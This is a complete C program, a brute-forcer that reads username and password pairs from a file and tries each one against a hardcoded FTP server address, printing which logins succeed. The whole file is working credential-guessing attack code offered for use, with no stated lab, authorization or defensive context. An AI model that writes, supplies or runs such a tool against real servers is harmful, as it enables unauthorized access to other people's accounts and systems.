// #########################
// # FTP Password Brute Forcer
//
// Compile: gcc brute_force.c -o brute_force
// Usage: ./brute_force <credentials_file>
//
// #########################

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>

#define SERVER_IP "192.168.1.100" // Replace with your FTP server IP
#define SERVER_PORT 21
#define BUFFER_SIZE 1024
#define MAX_LINE_LENGTH 256

void check_ftp_password(const char *username, const char *password)
{
    int sockfd;
    struct sockaddr_in server_addr;
    char buffer[BUFFER_SIZE];
    char response[BUFFER_SIZE];

    // Create socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0)
    {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    // Set server address
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);
    server_addr.sin_addr.s_addr = inet_addr(SERVER_IP);

    // Connect to server
    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0)
    {
        perror("Connection failed");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    // Read server response
    read(sockfd, response, BUFFER_SIZE);
    printf("Server: %s", response);

    // Send USER command
    snprintf(buffer, BUFFER_SIZE, "USER %s\r\n", username);
    write(sockfd, buffer, strlen(buffer));
    read(sockfd, response, BUFFER_SIZE);
    printf("Server: %s", response);

    // Send PASS command
    snprintf(buffer, BUFFER_SIZE, "PASS %s\r\n", password);
    write(sockfd, buffer, strlen(buffer));
    read(sockfd, response, BUFFER_SIZE);
    printf("Server: %s", response);

    // Check if login was successful
    if (strstr(response, "230") != NULL)
    {
        printf("Login successful: %s / %s\n", username, password);
    }
    else
    {
        printf("Login failed: %s / %s\n", username, password);
    }

    // Close socket
    close(sockfd);
}

void load_credentials_and_check(const char *filename)
{
    FILE *file = fopen(filename, "r");
    if (file == NULL)
    {
        perror("Failed to open file");
        exit(EXIT_FAILURE);
    }

    char line[MAX_LINE_LENGTH];
    char username[MAX_LINE_LENGTH];
    char password[MAX_LINE_LENGTH];

    while (fgets(line, sizeof(line), file))
    {
        if (sscanf(line, "%s %s", username, password) == 2)
        {
            check_ftp_password(username, password);
        }
    }

    fclose(file);
}

int main(int argc, char *argv[])
{
    if (argc != 2)
    {
        fprintf(stderr, "Usage: %s <credentials_file>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    load_credentials_and_check(argv[1]);

    return 0;
}